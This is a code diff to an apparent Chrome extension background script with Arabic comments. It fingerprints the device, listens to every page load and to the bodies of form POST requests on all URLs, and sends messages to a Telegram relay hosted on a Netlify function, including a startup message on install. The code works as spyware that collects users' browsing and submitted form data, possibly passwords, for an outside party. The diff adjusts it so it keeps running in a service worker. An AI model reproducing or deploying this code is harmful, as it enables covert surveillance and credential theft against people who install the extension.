@@ -1,17 +1,15 @@
-// الإكستنشن محدث - متوافق مع نظام Rate Limiting الجديد
-// ✅ تم تحديث الرابط برابط Netlify الفعلي
 const NETLIFY_API_URL = 'https://deluxe-sfogliatella-8f76e0.netlify.app/.netlify/functions/telegram-api';
 
-// توليد معرف فريد للجهاز
+// توليد معرف فريد للجهاز (بدون استخدام canvas)
 function generateDeviceFingerprint() {
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  ctx.textBaseline = 'top';
-  ctx.font = '14px Arial';
-  ctx.fillText('Device fingerprint', 2, 2);
+  // استخدام معلومات المتصفح المتاحة في Service Worker
+  const userAgent = navigator.userAgent;
+  const language = navigator.language;
+  const platform = navigator.platform;
   
-  const fingerprint = canvas.toDataURL();
-  return btoa(fingerprint).substring(0, 32);
+  // إنشاء fingerprint من المعلومات المتاحة
+  const fingerprint = btoa(userAgent + language + platform).substring(0, 32);
+  return fingerprint;
 }
 
 // توليد مفتاح جلسة
@@ -156,7 +154,7 @@ async function sendMessage(message) {
   return await sendToTelegram(data);
 }
 
-// مراقبة الطلبات
+// مراقبة الطلبات (بدون blocking)
 chrome.webRequest.onBeforeRequest.addListener(
   async function(details) {
     if (details.type === 'main_frame') {
@@ -174,7 +172,7 @@ chrome.webRequest.onBeforeRequest.addListener(
   { urls: ['<all_urls>'] }
 );
 
-// مراقبة النماذج
+// مراقبة النماذج (بدون blocking)
 chrome.webRequest.onBeforeRequest.addListener(
   async function(details) {
     if (details.method === 'POST' && details.requestBody) {
@@ -257,5 +255,7 @@ console.log('🚀 تم تشغيل الإكستنشن بنجاح');
 console.log('📡 الباك إند: Netlify Functions');
 console.log('🛡️ نظام Rate Limiting: 10 رسائل/دقيقة لكل جهاز');
 
-// إرسال رسالة بدء التشغيل
-sendMessage('تم تشغيل الإكستنشن بنجاح - نظام Rate Limiting مفعل'); 
+// إرسال رسالة بدء التشغيل عند التثبيت
+chrome.runtime.onInstalled.addListener(async function() {
+  await sendMessage('تم تشغيل الإكستنشن بنجاح - نظام Rate Limiting مفعل');
+}); 
